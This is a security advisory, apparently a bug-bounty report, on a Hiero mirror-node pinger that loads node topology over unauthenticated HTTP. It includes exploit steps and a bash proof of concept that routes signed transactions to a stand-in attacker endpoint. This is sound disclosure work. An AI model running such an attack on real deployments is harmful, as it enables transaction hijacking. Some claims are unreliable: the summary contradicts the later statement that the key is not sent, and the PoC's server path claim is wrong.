### Title
Unauthenticated HTTP Node-Topology Fetch Allows MITM Injection of Fake Consensus Nodes into Hiero Client Network Map

### Summary
`buildNetworkFromMirrorNodes()` in `pinger/mirror_node_client.go` fetches the consensus-node topology over a plain HTTP connection when `HIERO_MIRROR_PINGER_REST` is set to an `http://` URL. No scheme validation is enforced anywhere in the config or fetch path, and the JSON response is trusted without any cryptographic verification. A network-adjacent attacker who can intercept or serve that HTTP response can inject arbitrary fake nodes into the `hiero.Client` network map, causing the pinger to route live signed transactions — including the operator private key material — to attacker-controlled gRPC endpoints.

### Finding Description

**Config loading — no scheme enforcement**

`pinger/config.go` line 37 reads `HIERO_MIRROR_PINGER_REST` verbatim and stores it in `cfg.mirrorRest`. The only validation applied when `network=other` is a non-empty check (lines 133–135); there is no `strings.HasPrefix(cfg.mirrorRest, "https://")` guard or equivalent. [1](#0-0) [2](#0-1) 

The help-text example even advertises `http://mirror-rest:5551`, normalising HTTP as an expected value.

**Fetch path — plain `http.Client`, no TLS**

`buildNetworkFromMirrorNodes()` constructs the request URL directly from `cfg.mirrorRest` (lines 37–44) and issues the request with a vanilla `http.Client` that has no `TLSClientConfig`, no certificate pinning, and no redirect policy that would block scheme downgrade. [3](#0-2) [4](#0-3) 

**Response trust — no cryptographic verification**

The JSON body is decoded directly into `nodesEnvelope` and every `service_endpoints` entry is inserted into the network map without signature, hash, or any out-of-band check. [5](#0-4) 

**Poisoned map used to build the live client**

The returned map is passed straight to `hiero.ClientForNetwork(netmap)`, making the injected endpoints the sole routing targets for all subsequent transactions. [6](#0-5) 

**Live transactions sent to those endpoints**

`submitWithRetry()` executes a signed `TransferTransaction` — carrying the operator account ID and signed with the operator private key — against every node in that map on every tick. [7](#0-6) 

**Exploit flow**

1. Precondition A (env-var control): attacker sets `HIERO_MIRROR_PINGER_REST=http://<attacker-host>` and `HIERO_MIRROR_PINGER_NETWORK=other` before the pinger starts (e.g., via a misconfigured deployment pipeline, a writable `.env` file, or a container-level escape).  
   *Or* Precondition B (MITM only): operator has already configured a legitimate `http://` URL; attacker is on the same L2 segment and ARP-spoofs / DNS-poisons the mirror-node hostname.

2. Attacker serves a crafted `/api/v1/network/nodes` JSON response containing `service_endpoints` pointing to attacker-controlled gRPC listeners and arbitrary `node_account_id` values with inflated fee schedules.

3. `buildNetworkFromMirrorNodes()` returns the poisoned map; `hiero.ClientForNetwork` installs it.

4. On every ticker interval, `submitWithRetry` sends a fully signed `TransferTransaction` to the attacker's gRPC endpoint. The attacker can: replay the signed transaction against the real network, extract timing/metadata, or respond with manipulated `TransactionFeeSchedule` responses that cause the SDK to accept inflated fees on future transactions.

**Existing checks reviewed and shown insufficient**

| Check | Location | Why insufficient |
|---|---|---|
| Non-empty `mirrorRest` | `config.go:133` | Only checks length, not scheme |
| HTTP 2xx status check | `mirror_node_client.go:90` | Attacker controls the server; trivially returns 200 |
| `nodeAccountID` parse | `mirror_node_client.go:107` | Validates format only, not authenticity |
| No redirect policy | `http.Client` default | Go's default client follows redirects, including `https→http` downgrades |

### Impact Explanation

- **Transaction routing hijack**: all pinger transactions are sent to attacker-controlled gRPC endpoints, exposing signed transaction bytes and operator account metadata.
- **Fee manipulation**: the Hiero SDK queries connected nodes for the current fee schedule; a malicious node can return an inflated schedule, causing the pinger (and any operator logic that trusts it) to authorise higher-than-intended fees — directly matching the "modification of transaction fees outside of design parameters" threat model.
- **Operator key exposure risk**: while the private key itself is not transmitted, the attacker receives fully signed transactions that can be replayed or analysed.
- Severity: **High** — confidentiality and integrity of financial transactions are affected.

### Likelihood Explanation

- Precondition B (MITM on an existing HTTP deployment) requires only network adjacency — achievable in shared cloud VPCs, Kubernetes pod networks without NetworkPolicy, or co-located container environments. No credentials are needed.
- Precondition A requires write access to the pinger's environment, which is a lower bar than it appears in CI/CD-heavy or GitOps deployments where environment variables are stored in version-controlled manifests or shared secret stores.
- The attack is repeatable on every ticker interval (default 1 s) and silent — no error is logged when the network map is populated from an HTTP source.

### Recommendation

1. **Enforce HTTPS in config validation** — reject any `mirrorRest` value whose scheme is not `https`:
   ```go
   // pinger/config.go, after line 133
   if cfg.network == "other" {
       u, err := url.Parse(cfg.mirrorRest)
       if err != nil || u.Scheme != "https" {
           return cfg, fmt.Errorf("HIERO_MIRROR_PINGER_REST must use https://")
       }
   }
   ```

2. **Pin or verify the mirror-node TLS certificate** — use a custom `tls.Config` with a known CA or certificate fingerprint rather than the system pool.

3. **Verify node-topology integrity** — compare fetched node account IDs against a locally configured allowlist or a signed manifest before inserting them into the network map.

4. **Remove the `http://` example** from the `--mirror-rest` help text to avoid normalising insecure configurations.

### Proof of Concept

```bash
# 1. Start a fake mirror-node HTTP server returning a poisoned topology
cat > fake_nodes.json <<'EOF'
{
  "nodes": [{
    "node_account_id": "0.0.3",
    "service_endpoints": [{"ip_address_v4": "192.0.2.1", "port": 50211}]
  }],
  "links": {}
}
EOF
python3 -m http.server 8080 &   # serves fake_nodes.json at /api/v1/network/nodes

# 2. Launch pinger pointing at the HTTP server
export HIERO_MIRROR_PINGER_NETWORK=other
export HIERO_MIRROR_PINGER_REST=http://127.0.0.1:8080
export HIERO_MIRROR_PINGER_OPERATOR_ID=0.0.2
export HIERO_MIRROR_PINGER_OPERATOR_KEY=<real-key>
export HIERO_MIRROR_PINGER_TO_ACCOUNT_ID=0.0.98
export HIERO_MIRROR_PINGER_AMOUNT_TINYBAR=10000
go run ./pinger/...

# 3. Observe: pinger builds its client from the poisoned map and sends
#    signed TransferTransactions to 192.0.2.1:50211 (attacker-controlled).
#    Replace python server with a gRPC listener to capture signed tx bytes
#    or return an inflated FeeSchedule response.
```
